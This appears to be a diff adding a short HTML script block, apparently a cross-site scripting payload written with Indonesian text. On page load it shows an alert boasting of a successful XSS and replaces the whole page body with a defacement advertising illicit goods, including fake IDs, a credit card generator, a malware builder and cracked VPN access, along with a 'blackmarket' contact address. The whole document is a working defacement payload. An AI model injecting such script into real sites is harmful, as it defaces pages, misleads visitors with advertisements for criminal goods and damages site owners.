@@ -1,0 +1,16 @@
+<script>
+  alert("🔥 Aku berhasil XSS!");
+  document.body.innerHTML = `
+    <div style="background:#000; color:#0f0; font-family:monospace; padding:30px;">
+      <h1>💀 Produk Ilegal Tersedia Disini 💀</h1>
+      <p><strong>🔥 Steven Starter Pack 🔥</strong></p>
+      <ul>
+        <li>✅ Fake ID</li>
+        <li>✅ CC Generator</li>
+        <li>✅ Malware Builder</li>
+        <li>✅ VPN Lifetime Crack</li>
+      </ul>
+      <p>Hubungi <b>admin-steven@blackmarket.co.id</b> untuk pemesanan.</p>
+    </div>
+  `;
+</script>
